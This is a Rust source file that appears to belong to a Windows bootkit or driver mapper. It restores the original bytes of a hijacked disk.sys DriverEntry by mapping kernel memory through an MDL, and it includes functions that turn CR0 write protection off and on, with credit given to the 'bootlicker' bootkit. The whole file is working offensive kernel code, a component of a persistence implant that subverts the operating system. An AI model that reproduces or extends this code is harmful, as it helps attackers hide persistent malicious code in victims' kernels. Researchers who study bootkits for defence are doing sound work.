use core::ptr::{copy_nonoverlapping, null_mut};

use kernel_log::KernelLogger;
use log::LevelFilter;
use winapi::km::wdm::KPROCESSOR_MODE::KernelMode;
use crate::includes::LOCK_OPERATION::IoModifyAccess;
use kernel_alloc::nt::MEMORY_CACHING_TYPE::MmNonCached;
use crate::includes::_MM_PAGE_PRIORITY::HighPagePriority;

use crate::includes::{MmMapLockedPagesSpecifyCache, MmUnlockPages, IoFreeMdl, MmUnmapLockedPages};
use crate::{includes::{IoAllocateMdl, MmProbeAndLockPages}, mapper_data};

pub fn magic(target_module_entry: *mut u8) {
    KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");
    
    log::info!("[+] Driver Entry called");
    log::info!("[+] Disk.sys DriverEntry Address: {:p}", target_module_entry);
    log::info!("[+] Stolen Bytes Address: {:p}", unsafe { mapper_data.as_ptr() });

    /* Force to 1 CPU */
    //unsafe { KeSetSystemAffinityThread(1) };

    /* Remove write protection */
    // Credits Austin Hudson: https://github.com/realoriginal/bootlicker/blob/master/bootkit/DrvMain.c#L116
    //log::info!("[+] Write protection removed");
    //disable_write_protect();

    // Restore stolen bytes before we do anything else
    log::info!("[+] Calling memcopywp to restore bytes");
    unsafe { memcopywp(target_module_entry) };
    log::info!("[+] Stolen bytes restored");

    /* Insert write protection */
    // Credits Austin Hudson: https://github.com/realoriginal/bootlicker/blob/master/bootkit/DrvMain.c#L128
    //log::info!("[+] Write protection restored");
    //enable_write_protect();
}

pub unsafe fn memcopywp(target_module_entry: *mut u8) -> Option<()> {

    let mdl = IoAllocateMdl(target_module_entry as _, mapper_data.len() as u32, 0, 0, null_mut());

    if mdl.is_null() {
        log::info!("[-] Failed to call IoAllocateMdl");
        return None;
    }

    MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);

    let mapped = unsafe { 
        MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, null_mut(), 0, HighPagePriority as _)
    };

    if mapped.is_null() {
        log::info!("[-] Failed to call MmMapLockedPagesSpecifyCache");
        MmUnlockPages(mdl);
        IoFreeMdl(mdl);
        return None;
    }

    log::info!("[+] Restoring Mapper Data....");
    copy_nonoverlapping(mapper_data.as_ptr(), mapped as _, mapper_data.len());

    log::info!("[+] Cleanup....");
    MmUnmapLockedPages(mapped, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);

    log::info!("[+] Done");

    Some(())
}

#[allow(dead_code)]
fn enable_write_protect() {
    let mut cr0 = x86_64::registers::control::Cr0::read();
    cr0.insert(x86_64::registers::control::Cr0Flags::WRITE_PROTECT);
    unsafe { x86_64::registers::control::Cr0::write(cr0) };
}

#[allow(dead_code)]
fn disable_write_protect() {
    let mut cr0 = x86_64::registers::control::Cr0::read();
    cr0.remove(x86_64::registers::control::Cr0Flags::WRITE_PROTECT);
    unsafe { x86_64::registers::control::Cr0::write(cr0) };
}